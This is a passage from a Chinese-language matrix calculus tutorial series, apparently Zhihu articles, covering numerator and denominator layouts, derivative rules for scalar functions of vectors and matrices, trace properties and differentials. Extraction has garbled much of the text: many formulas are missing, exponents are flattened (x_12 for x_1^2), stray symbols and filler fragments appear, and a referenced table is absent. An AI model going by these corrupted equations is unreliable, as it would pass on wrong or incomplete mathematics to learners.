1}\\pmb{X}} = \\begin{bmatrix} \\frac{\\partial f{11}}{\\partial x_{11}}&amp;\\frac{\\partial f_{21}}{\\partial x_{11}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{11}}&amp;\\frac{\\partial f_{12}}{\\partial x_{11}}&amp;\\frac{\\partial f_{22}}{\\partial x_{11}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{11}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{11}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{11}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{11}}\\ \\frac{\\partial f_{11}}{\\partial x_{21}}&amp;\\frac{\\partial f_{21}}{\\partial x_{21}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{21}}&amp;\\frac{\\partial f_{12}}{\\partial x_{21}}&amp;\\frac{\\partial f_{22}}{\\partial x_{21}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{21}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{21}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{21}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{21}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f_{11}}{\\partial x_{m1}}&amp;\\frac{\\partial f_{21}}{\\partial x_{m1}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{m1}}&amp;\\frac{\\partial f_{12}}{\\partial x_{m1}}&amp;\\frac{\\partial f_{22}}{\\partial x_{m1}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{m1}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{m1}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{m1}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{m1}}\\ \\frac{\\partial f_{11}}{\\partial x_{12}}&amp;\\frac{\\partial f_{21}}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{12}}&amp;\\frac{\\partial f_{12}}{\\partial x_{12}}&amp;\\frac{\\partial f_{22}}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{12}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{12}}\\ \\frac{\\partial f_{11}}{\\partial x_{22}}&amp;\\frac{\\partial f_{21}}{\\partial x_{22}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{22}}&amp;\\frac{\\partial f_{12}}{\\partial x_{22}}&amp;\\frac{\\partial f_{22}}{\\partial x_{22}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{22}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{22}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{22}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{22}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f_{11}}{\\partial x_{m2}}&amp;\\frac{\\partial f_{21}}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{m2}}&amp;\\frac{\\partial f_{12}}{\\partial x_{m2}}&amp;\\frac{\\partial f_{22}}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{m2}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{m2}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f_{11}}{\\partial x_{1n}}&amp;\\frac{\\partial f_{21}}{\\partial x_{1n}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{1n}}&amp;\\frac{\\partial f_{12}}{\\partial x_{1n}}&amp;\\frac{\\partial f_{22}}{\\partial x_{1n}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{1n}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{1n}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{1n}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{1n}}\\ \\frac{\\partial f_{11}}{\\partial x_{2n}}&amp;\\frac{\\partial f_{21}}{\\partial x_{2n}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{2n}}&amp;\\frac{\\partial f_{12}}{\\partial x_{2n}}&amp;\\frac{\\partial f_{22}}{\\partial x_{2n}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{2n}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{2n}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{2n}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{2n}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f_{11}}{\\partial x_{mn}}&amp;\\frac{\\partial f_{21}}{\\partial x_{mn}}&amp;\\cdots&amp;\\frac{\\partial f_{p1}}{\\partial x_{mn}}&amp;\\frac{\\partial f_{12}}{\\partial x_{mn}}&amp;\\frac{\\partial f_{22}}{\\partial x_{mn}}&amp;\\cdots&amp;\\frac{\\partial f_{p2}}{\\partial x_{mn}}&amp;\\cdots&amp;\\frac{\\partial f_{1q}}{\\partial x_{mn}}&amp;\\frac{\\partial f_{2q}}{\\partial x_{mn}}&amp;\\cdots&amp;\\frac{\\partial f_{pq}}{\\partial x_{mn}}\\ \\end{bmatrix}_{mn \\times pq} \\ (14)$$ 3.3 一些发现 3.3.1 转置 (13) 式与 (14) 式互为转置。 3.3.2 相等1 当实矩阵函数 本身是一个实值标量函数 f 时， (8) 式、(13) 式相等； (10) 式、 (14) 式相等；当然，前两个式子与后两个式子互为转置。 这一发现说明，对于矩阵变元的实值标量函数 $f(\\pmb{X}) , \\pmb{X}{m\\times n}=(x{ij})_{i=1,j=1}^{m,n}，结果布局本质上有四种形式，第一种是\\text{Jacobian}$ 矩阵（已经成行向量了）形式，第二种是梯度矩阵（已经成列向量了）形式，第三种是 矩阵（就是矩阵）形式，第四种是梯度矩阵（就是矩阵）形式。第一种和第二种形式互为转置，第三种和第四种形式互为转置。 3.3.3 相等2 当矩阵变元 本身就是一个列向量 时， 同时实矩阵函数 本身是一个实值标量函数 f 时， (5) 式、 (8) 式、 (9) 式、 (13) 式相等； (6) 式、 (10) 式、 (11) 式、 (14) 式相等；当然，前四个式子与后四个式子互为转置。 这一发现仍说明，对于向量变元的实值标量函数 ，结果布局本质上有两种形式，一种是 矩阵（已经成行向量了）形式，一种是梯度矩阵（已经成列向量了）形式。两种形式互为转置。 4、矩阵变元的实向量函数 、向量变元的实向量函数 、向量变元的实矩阵函数 这三个都可以看做是矩阵变元的实矩阵函数 ，可使用**3、**进行计算（因为向量就是一种特殊的矩阵）。 ※分子布局、分母布局的本质 看到这里，相信同学们对矩阵求导结果的布局有了很全面的了解了，无非就是分子的转置、向量化，分母的转置、向量化，它们的各种组合而已。 结合上述知识，我们总结： 1、分子布局的本质：分子是标量、列向量、矩阵向量化后的列向量；分母是标量、列向量转置后的行向量、矩阵的转置矩阵、矩阵向量化后的列向量转置后的行向量。包含 (5) 式、 (8) 式、 (9) 式、 (13) 式。 2、分母布局的本质：分子是标量、列向量转置后的行向量、矩阵向量化后的列向量转置后的行向量；分母是标量、列向量、矩阵自己、矩阵向量化后的列向量。包含 (6) 式、 (10) 式、 (11) 式、 (14) 式。 思考一下，其实我们可以再简洁一些：谁转置了，就是另一方的布局。分子转置了，就是分母布局；分母转置了，就是分子布局。 最终，我们列一个表格，总结分子布局、分子布局的本质： 分子布局、分母布局的本质 ※完 本文到这里就结束了，希望对大家有帮助。如果有时间的话，后面我会再发一篇文章，来进行**若干常见矩阵求导公式的数学推导。**欢迎大家点赞、关注、收藏、转发噢~ 矩阵求导系列其他文章： 对称矩阵的求导，以多元正态分布的极大似然估计为例（矩阵求导——补充篇） - Iterator的文章 - 知乎 矩阵求导公式的数学推导（矩阵求导——进阶篇） - Iterator的文章 - 知乎 矩阵求导公式的数学推导（矩阵求导——基础篇） - Iterator的文章 - 知乎 ※参考 矩阵求导公式的数学推导（矩阵求导——基础篇） ※前言 1、看本文之前请务必先看这篇文章： 下文以\"本质篇\"指代上面这篇文章。 2、本文介绍向量变元的实值标量函数、矩阵变元的实值标量函数中最基础的矩阵求导公式的数学推导。掌握了这些最基础的推导，才能理解之后的那些千变万化的技巧。 3、进阶的技巧（矩阵的迹 与一阶实矩阵微分会在下一篇讲，本篇不涉及。 4、本文使用的符号与本质篇相同。 5、看懂本文需要了解本质篇所提及的知识，以及了解本科阶段线性代数中矩阵乘法、向量内积的知识**，无需任何其他知识。** **6、**有一个矩阵求导的网站，大家可以验证自己算的结果是否正确。 ※向量变元的实值标量函数 我们使用梯度向量形式，即 (本质篇_6) 式 本质篇 1、四个法则 1.1 常数求导[1:1]： 与一元函数常数求导相同：结果为零向量 其中， c 为常数。 证明： 证毕。 1.2 线性法则[1:2] 与一元函数求导线性法则相同：相加再求导等于求导再相加，常数提外面 其中， 为常数。 证明： 证毕。 1.3 乘积法则[1] 与一元函数求导乘积法则相同：前导后不导 加 前不导后导 证明： 证毕。 1.4 商法则[1] 与一元函数求导商法则相同：（上导下不导 减 上不导下导）除以（下的平方）： 其中， 。 证明： 证毕。 2、几个公式 2.1 其中， 为常数向量， 。 证明： 证毕。 2.2 证明： $$\\frac{\\partial( \\pmb{x}^T \\pmb{x})}{\\partial{\\pmb{x}}} = \\frac{\\partial( x_12+x_22+\\cdots+x_n^2)}{\\partial{\\pmb{x}}} = \\begin{bmatrix} \\frac{\\partial( x_12+x_22+\\cdots+x_n^2)}{\\partial{x_1}} \\ \\frac{\\partial( x_12+x_22+\\cdots+x_n^2)}{\\partial{x_2}} \\ \\vdots \\ \\frac{\\partial( x_12+x_22+\\cdots+x_n^2)}{\\partial{x_n}} \\end{bmatrix} = = 2 = 2\\pmb{x} (12)$$ 证毕。 2.3 其中， $\\pmb{A}{n \\times n} 是常数矩阵， \\pmb{A}{n \\times n}=(a_{ij})_{i=1,j=1}^{n,n}$ 。 证明： 证毕。 2.4 $$\\frac{\\partial( \\pmb{a}T\\pmb{x}\\pmb{x}T\\pmb{b})}{\\partial{\\pmb{x}}} = \\pmb{a}\\pmb{b}T\\pmb{x}+\\pmb{b}\\pmb{a}T\\pmb{x} (15)$$ 其中， 为常数向量， $\\pmb{a}=(a_1,a_2,\\cdots,a_n)T,\\pmb{b}=(b_1,b_2,\\cdots,b_n)T$ 。 证明： 因为 $\\pmb{a}T\\pmb{x}=\\pmb{x}T\\pmb{a},\\pmb{x}T\\pmb{b}=\\pmb{b}T\\pmb{x}$ ，所以有 $$\\frac{\\partial( \\pmb{a}T\\pmb{x}\\pmb{x}T\\pmb{b})}{\\partial{\\pmb{x}}} = \\frac{\\partial( \\pmb{x}T\\pmb{a}\\pmb{b}T\\pmb{x})}{\\partial{\\pmb{x}}} (16)$$ 又因为 是 常数矩阵，由 (13) 式得： $$\\frac{\\partial( \\pmb{a}T\\pmb{x}\\pmb{x}T\\pmb{b})}{\\partial{\\pmb{x}}} = \\frac{\\partial( \\pmb{x}T\\pmb{a}\\pmb{b}T\\pmb{x})}{\\partial{\\pmb{x}}}=\\pmb{a}\\pmb{b}T\\pmb{x}+\\pmb{b}\\pmb{a}T\\pmb{x} (17)$$ 证毕。 ※矩阵变元的实值标量函数 $$f(\\pmb{X}),\\pmb{X}{m\\times n}=(x{ij})_{i=1,j=1}^{m,n} $$ 我们使用梯度矩阵形式，即 (本质篇_11) 式 $$\\nabla_{\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\pmb{X}{m\\times n}} = \\begin{bmatrix} \\frac{\\partial f}{\\partial x{11}}&amp;\\frac{\\partial f}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f}{\\partial x_{1n}} \\ \\frac{\\partial f}{\\partial x_{21}}&amp;\\frac{\\partial f}{\\partial x_{22}}&amp; \\cdots &amp; \\frac{\\partial f}{\\partial x_{2n}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f} {\\partial x_{m1}}&amp;\\frac{\\partial f}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f}{\\partial x_{mn}} \\end{bmatrix}_{m\\times n} \\ (本质篇_11)$$ 1、四个法则 1.1 常数求导[1:3]： 与一元函数常数求导相同：结果为零矩阵 其中， c 为常数。 证明： $$\\frac{\\partial{c}}{\\partial{\\pmb{X}}} = {m \\times n} = {m \\times n} =\\pmb{0}_{m \\times n}(19)$$ 证毕。 1.2 线性法则[1:4] 与一元函数求导线性法则相同：相加再求导等于求导再相加，常数提外面 其中， 为常数。 证明： 证毕。 1.3 乘积法则[1] 与一元函数求导乘积法则相同：前导后不导 加 前不导后导 证明： 证毕。 1.4 商法则[1] 与一元函数求导商法则相同：（上导下不导 减 上不导下导）除以（下的平方）： 其中， 。 证明： 证毕。 2、几个公式 2.1 其中， $\\pmb{a}{m \\times 1},\\pmb{b}{n \\times 1} 为常数向量，\\pmb{a}_=(a_1,a_2,\\cdots,a_m)T,\\pmb{b}=(b_1,b_2,\\cdots,b_n)T$。 证明（右击公式，选择在新标签页中打开图片，公式就可以放大了~）： $$\\frac{\\partial( \\pmb{a}^T\\pmb{X}\\pmb{b})}{\\partial{\\pmb{X}}} = \\frac{\\partial(a_1b_1x_{11}+a_1b_2x_{12}+\\cdots+a_1b_nx_{1n} \\ +a_2b_1x_{21}+a_2b_2x_{22}+\\cdots+a_2b_nx_{2n}\\ +\\cdots \\ +a_mb_1x_{m1}+a_mb_2x_{m2}+\\cdots+a_mb_nx_{mn})}{\\partial{\\pmb{X}}} = {m \\times n} = {m \\times n} = [b_1,b_2,\\cdots,b_n] = \\pmb{a}\\pmb{b}^T (27)$$ 证毕。 2.2 $$\\frac{\\partial( \\pmb{a}T\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}} = \\pmb{b}\\pmb{a}^T (28)$$ 其中， $\\pmb{a}{n \\times 1},\\pmb{b}{m \\times 1} 为常数向量，\\pmb{a}_=(a_1,a_2,\\cdots,a_n)T,\\pmb{b}=(b_1,b_2,\\cdots,b_m)T$。 证明： 因为标量的转置等于标量自己，所以有 $$\\frac{\\partial(\\pmb{a}T\\pmb{X}T\\pmb{b})}{\\partial\\pmb{X}}=\\frac{\\partial(\\pmb{a}T\\pmb{X}T\\pmb{b})T}{\\partial\\pmb{X}}=\\frac{\\partial(\\pmb{b}T\\pmb{X}\\pmb{a})}{\\partial\\pmb{X}} (29)$$ 由 (26) 式得： $$\\frac{\\partial(\\pmb{a}T\\pmb{X}T\\pmb{b})}{\\partial\\pmb{X}}=\\frac{\\partial(\\pmb{b}^T\\pmb{X}\\pmb{a})}{\\partial\\pmb{X}} = \\pmb{b}\\pmb{a}^T (30)$$ 证毕。 2.3 $$\\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}} = \\pmb{a}\\pmb{b}T\\pmb{X}+\\pmb{b}\\pmb{a}T\\pmb{X} (31)$$ 其中， $\\pmb{a}{m \\times 1},\\pmb{b}{m \\times 1} 为常数向量，\\pmb{a}_=(a_1,a_2,\\cdots,a_m)T,\\pmb{b}=(b_1,b_2,\\cdots,b_m)T$。 证明（右击公式，选择在新标签页中打开图片，公式就可以放大了~）： $$\\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}} = \\frac{\\partial( [(a_1b_1)(x_{11}x_{11}+x_{12}x_{12}+\\cdots+x_{1n}x_{1n})]+[(a_1b_2)(x_{11}x_{21}+x_{12}x_{22}+\\cdots+x_{1n}x_{2n})]+\\cdots+[(a_1b_m)(x_{11}x_{m1}+x_{12}x_{m2}+\\cdots+x_{1n}x_{mn})] \\ +[(a_2b_1)(x_{21}x_{11}+x_{22}x_{12}+\\cdots+x_{2n}x_{1n})]+[(a_2b_2)(x_{21}x_{21}+x_{22}x_{22}+\\cdots+x_{2n}x_{2n})]+\\cdots+[(a_2b_m)(x_{21}x_{m1}+x_{22}x_{m2}+\\cdots+x_{2n}x_{mn})] \\ +\\cdots \\ +[(a_mb_1)(x_{m1}x_{11}+x_{m2}x_{12}+\\cdots+x_{mn}x_{1n})]+[(a_mb_2)(x_{m1}x_{21}+x_{m2}x_{22}+\\cdots+x_{mn}x_{2n})]+\\cdots+[(a_mb_m)(x_{m1}x_{m1}+x_{m2}x_{m2}+\\cdots+x_{mn}x_{mn})] )}{\\partial{\\pmb{X}}} \\= {m \\times n} \\= \\begin{bmatrix} (a_1b_1x{11}+a_1b_2x_{21}+\\cdots+a_1b_mx_{m1})+(b_1a_1x_{11}+b_1a_2x_{21}+\\cdots+b_1a_mx_{m1}) &amp; (a_1b_1x_{12}+a_1b_2x_{22}+\\cdots+a_1b_mx_{m2})+(b_1a_1x_{12}+b_1a_2x_{22}+\\cdots+b_1a_mx_{m2}) &amp; \\cdots &amp; (a_1b_1x_{1n}+a_1b_2x_{2n}+\\cdots+a_1b_mx_{mn})+(b_1a_1x_{1n}+b_1a_2x_{2n}+\\cdots+b_1a_mx_{mn}) \\ (a_2b_1x_{11}+a_2b_2x_{21}+\\cdots+a_2b_mx_{m1})+(b_2a_1x_{11}+b_2a_2x_{21}+\\cdots+b_2a_mx_{m1}) &amp; (a_2b_1x_{12}+a_2b_2x_{22}+\\cdots+a_2b_mx_{m2})+(b_2a_1x_{12}+b_2a_2x_{22}+\\cdots+b_2a_mx_{m2}) &amp; \\cdots &amp; (a_2b_1x_{1n}+a_2b_2x_{2n}+\\cdots+a_2b_mx_{mn})+(b_2a_1x_{1n}+b_2a_2x_{2n}+\\cdots+b_2a_mx_{mn}) \\ \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots \\ (a_mb_1x_{11}+a_mb_2x_{21}+\\cdots+a_mb_mx_{m1})+(b_ma_1x_{11}+b_ma_2x_{21}+\\cdots+b_ma_mx_{m1}) &amp; (a_mb_1x_{12}+a_mb_2x_{22}+\\cdots+a_mb_mx_{m2})+(b_ma_1x_{12}+b_ma_2x_{22}+\\cdots+b_ma_mx_{m2}) &amp; \\cdots &amp; (a_mb_1x_{1n}+a_mb_2x_{2n}+\\cdots+a_mb_mx_{mn})+(b_ma_1x_{1n}+b_ma_2x_{2n}+\\cdots+b_ma_mx_{mn}) \\end{bmatrix} \\= + = + = [b_1, b_2, \\cdots, b_m] + [a_1, a_2, \\cdots, a_m] = \\pmb{a}\\pmb{b}T\\pmb{X}+\\pmb{b}\\pmb{a}T\\pmb{X} (32)$$ 证毕。 2.4 $$\\frac{\\partial( \\pmb{a}T\\pmb{X}T\\pmb{X}\\pmb{b})}{\\partial{\\pmb{X}}} = \\pmb{X}\\pmb{b}\\pmb{a}T+\\pmb{X}\\pmb{a}\\pmb{b}T (33)$$ 其中， $\\pmb{a}{n \\times 1},\\pmb{b}{n \\times 1} 为常数向量，\\pmb{a}_=(a_1,a_2,\\cdots,a_n)T,\\pmb{b}=(b_1,b_2,\\cdots,b_n)T$。 证明： 我们来看一下 (本质篇_9) 式： $$\\text{D}{\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\pmb{X}^T{m\\times n}} = _{n\\times m} \\ (本质篇_9)$$ 再来看一下 (本质篇_11) 式： $$\\nabla_{\\pmb{X}}f(\\pmb{X})= \\frac{\\partial f(\\pmb{X})}{\\partial \\pmb{X}{m\\times n}} = \\begin{bmatrix} \\frac{\\partial f}{\\partial x{11}}&amp;\\frac{\\partial f}{\\partial x_{12}}&amp;\\cdots&amp;\\frac{\\partial f}{\\partial x_{1n}} \\ \\frac{\\partial f}{\\partial x_{21}}&amp;\\frac{\\partial f}{\\partial x_{22}}&amp; \\cdots &amp; \\frac{\\partial f}{\\partial x_{2n}}\\ \\vdots&amp;\\vdots&amp;\\vdots&amp;\\vdots\\ \\frac{\\partial f} {\\partial x_{m1}}&amp;\\frac{\\partial f}{\\partial x_{m2}}&amp;\\cdots&amp;\\frac{\\partial f}{\\partial x_{mn}} \\end{bmatrix}_{m\\times n} \\ (本质篇_11)$$ 正如本质篇_三._2.5.1 总结的那样，这两个结果互为转置，即： 所以，我们把 (31) 式中的分母的矩阵变元写为转置，就有： $$\\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}^T} = (\\frac{\\partial( \\pmb{a}T\\pmb{X}\\pmb{X}T\\pmb{b})}{\\partial{\\pmb{X}}})^T = (\\pmb{a}\\pmb{b}T\\pmb{X}+\\pmb{b}\\pmb{a}T\\pmb{X})^T = \\pmb{X}T\\pmb{b}\\pmb{a}T+\\pmb{X}T\\pmb{a}\\pmb{b}T (35)$$ 对于 (33) 式，我们将其写为如下形式： $$\\frac{\\partial( \\pmb{a}T\\pmb{X}T\\pmb{X}\\pmb{b})}{\\partial{\\pmb{X}}} =\\frac{\\partial( \\pmb{a}T(\\pmb{X}T)(\\pmb{X}T)T\\pmb{b})}{\\partial{(\\pmb{X}}T)T} (36)$$ 然后对 (36) 式使用 (35) 式，得： $$\\frac{\\partial( \\pmb{a}T\\pmb{X}T\\pmb{X}\\pmb{b})}{\\partial{\\pmb{X}}} =\\frac{\\partial( \\pmb{a}T(\\pmb{X}T)(\\pmb{X}T)T\\pmb{b})}{\\partial{(\\pmb{X}}T)T} = (\\pmb{X}T)T\\pmb{b}\\pmb{a}T+(\\pmb{X}T)T\\pmb{a}\\pmb{b}T = \\pmb{X}\\pmb{b}\\pmb{a}T+\\pmb{X}\\pmb{a}\\pmb{b}T (37)$$ 证毕。 ※完 本文到这里就结束了，相信大家也和我一样，会觉的后面那几个求导公式，如果按照定义去推导的话，十分的麻烦，而且容易出错。 所以， 在下一篇文章中，我们将介绍向量变元的实值标量函数、矩阵变元的实值标量函数进阶的矩阵求导的技巧：矩阵的迹 与一阶实矩阵微分 ，它们可以极大地化简我们的推导过程。 矩阵求导系列其他文章： 对称矩阵的求导，以多元正态分布的极大似然估计为例（矩阵求导——补充篇） - Iterator的文章 - 知乎 矩阵求导公式的数学推导（矩阵求导——进阶篇） - Iterator的文章 - 知乎 矩阵求导的本质与分子布局、分母布局的本质（矩阵求导——本质篇） - Iterator的文章 - 知乎 ※参考 [7](#ref_1_0)bcdefgh张贤达《矩阵分析与应用（第二版）》P147 矩阵求导公式的数学推导（矩阵求导——进阶篇） ※前言 1、看本文之前请务必按照顺序先看这两篇文章： 下文以\"本质篇\"，“基础篇”指代上面这两篇文章。 2、本文介绍向量变元的实值标量函数、矩阵变元的实值标量函数中进阶的矩阵求导的技巧：矩阵的迹 𝕥𝕣 与一阶实矩阵微分 。（文中的推导过程会使用到矩阵变元的实矩阵函数，但矩阵变元的实矩阵函数的求导本文不会涉及） **3、**本文章和前两篇文章的区别是什么，分别在什么时候使用： 答：我们知道，在高等数学中，导数的原始定义其实是在求极限，但我们在实际求导的过程中，不会真正去使用定义去求的，而是使用各种我们已知的比如幂函数、指数函数等的求导公式与乘积法则、复合法则等。矩阵求导也是类似的，我们在实际求导过程中，不会真正使用本质篇与基础篇的定义法去求，而是使用本文中的各种法则去求。 4、本文使用的符号与本质篇、基础篇相同。 5、看懂本文需要了解本质篇、基础篇所提及的知识，以及了解本科阶段线性代数中行列式、伴随矩阵、逆矩阵的知识**，以及了解本科阶段高等数学中的微分与全微分的知识，无需任何其他知识。** 6、本文前两节 一. 矩阵的迹 二. 微分与全微分是矩阵求导的前置知识，如果你已经很熟悉了，可以直接跳到 **三. 矩阵的微分。（**不过还是建议看一遍，加深印象） **7、**有一个矩阵求导的网站，大家可以验证自己算的结果是否正确。 ※矩阵的迹[1] 1、定义 的方阵 的主对角线元素之和就叫矩阵 的迹(trace)，记作 𝕥𝕣 ，即： $$\\pmb{A}{n \\times n}= \\begin{bmatrix} a{11} &amp; a_{12} &amp; \\cdots &amp; a_{1n} \\ a_{21} &amp; a_{22} &amp; \\cdots &amp; a_{2n} \\ \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\ a_{n1} &amp; a_{n2} &amp; \\cdots &amp; a_{nn} \\ \\end{bmatrix}_{n \\times n} $$ 的迹为： 𝕥𝕣 注意：只有方阵才有迹。 2、一些性质（很重要，下文需要用到，建议熟记） 2.1 标量的迹 对于一个标量 ,可以看成是 的矩阵，它的迹就是它自己。 𝕥𝕣 2.2 线性法则 相加再求迹等于求迹再相加，标量提外面 𝕥𝕣𝕥𝕣𝕥𝕣 其中， 为标量。 证明： 𝕥𝕣𝕥𝕣𝕥𝕣𝕥𝕣 证毕。 2.3 转置 转置的迹等于原矩阵的迹 𝕥𝕣𝕥𝕣 证明： 因为转置不会改变主对角线的元素，故成立。 证毕。 2.4 乘积的迹的本质 对于两个阶数都是 $m \\times n 的矩阵\\pmb{A}{m\\times n},\\pmb{B}{m\\times n}$, 其中一个矩阵乘以（左乘右乘都可以）另一个矩阵的转置的迹，本质是 $\\pmb{A}{m\\times n},\\pmb{B}{m\\times n}$ 两个矩阵对应位置的元素相乘并相加，可以理解为向量的点积在矩阵上的推广，即： 𝕥𝕣 证明： $$\\mathbb{tr}(\\pmb{A}\\pmb{B}^T) =\\mathbb{tr} \\= \\mathbb{tr} 不用管不用管不用管不用管不用管不用管{m \\times m} \\= a{11}b_{11}+a_{12}b_{12}+\\cdots+a_{1n}b_{1n} + a_{21}b_{21}+a_{22}b_{22}+\\cdots+a_{2n}b_{2n} + \\cdots + a_{m1}b_{m1}+a_{m2}b_{m2}+\\cdots+a_{mn}b_{mn} (7)$$ 证毕。 2.5 交换律 矩阵乘积位置互换，迹不变 𝕥𝕣𝕥𝕣 其中， $\\pmb{A}{m \\times n},\\pmb{B}{n \\times m}$ 。 证明： 把 $\\pmb{B}{n \\times m} 看做是 (\\pmb{B}^T){m \\times n}的转置。由乘积的迹的本质，即式可知，无论乘积怎么交换顺序，\\pmb{A}{m \\times n} 与 (\\pmb{B}^T){m \\times n}$ 对应位置的元素相乘并相加，永远是不变的。 证毕。 2.6 更多矩阵的交换律 𝕥𝕣𝕥𝕣𝕥𝕣 其中， $\\pmb{A}{m \\times n},\\pmb{B}{n \\times p},\\pmb{C}_{p \\times m}$ 。 证明： 把两个矩阵的乘积看做一个矩阵，和另外的一个矩阵应用交换律即可。 证毕。 2.7 熟练使用 𝕥𝕣𝕥𝕣𝕥𝕣𝕥𝕣 其中， $\\pmb{A}{m \\times n},\\pmb{B}{m \\times n}$ 。 证明： 第一个和第二个是交换律，第二个和三个是转置，第三个和第四个是交换律。 证毕。 ※微分与全微分 我们先来复习一下本科阶段所学的高等数学中的微分与全微分。 1、一元函数的微分 1.1 普通函数的微分[2] 设 ， 可导，则其微分为： 𝕕𝕕𝕕 1.2 复合函数的微分[3] 设 ，均可导，则 的微分为： 𝕕𝕕𝕕𝕕𝕕 乍一看很复杂，其实举个例子就很简单了： 设 ，则 的微分为： 𝕕𝕕𝕕𝕕𝕕𝕕 2、多元函数的全微分 2.1 普通函数的全微分[4] 设 ， 可微，则其全微分为： 𝕕𝕕𝕕 2.2 复合函数的全微分 设 可导，可微，则其全微分为： 𝕕𝕕𝕕𝕕𝕕𝕕𝕕 举个例子： 设 $z=\\sin(2x+y2),u=2x+y2 ，则 z$ 的全微分为： $$\\mathbb{d}z=\\mathbb{d}(\\sin u)=\\cos u\\mathbb{d}u=\\cos(2x+y2)\\mathbb{d}(2x+y2) =\\cos(2x+y^2)(2\\mathbb{d}x+2y\\mathbb{d}y) = 2\\cos(2x+y2)\\mathbb{d}x+2y\\cos(2x+y2)\\mathbb{d}y $$ 3、微分/全微分的法则[5] 3.1 常数的微分 𝕕 其中， 为常数。 3.2 线性法则 相加再微分等于微分再相加，常数提外面 𝕕𝕕𝕕 其中， 一元函数 或多元函数 ， 为常数。 3.3 乘积法则 前微后不微 前不微后微 𝕕𝕕𝕕 其中， 一元函数 或多元函数 。 3.4 商法则 （上微下不微 减 上不微下微）除以（下的平方） 𝕕𝕕𝕕 其中， 一元函数 或多元函数 。 ※矩阵的微分 1、向量变元的实值标量函数[6] 它其实就是多元函数，设其可微，则它的全微分，即 (14) 式： 𝕕𝕕𝕕𝕕𝕕𝕕𝕕 结果是标量，由 (2) 式可知， (17) 式可以写成迹的形式，即： 𝕕𝕕𝕕𝕕𝕥𝕣𝕕𝕕𝕕 2、矩阵变元的实值标量函数[7] $$f(\\pmb{X}),\\pmb{X}{m\\times n}=(x{ij})_{i=1,j=1}^{m,n} $$ 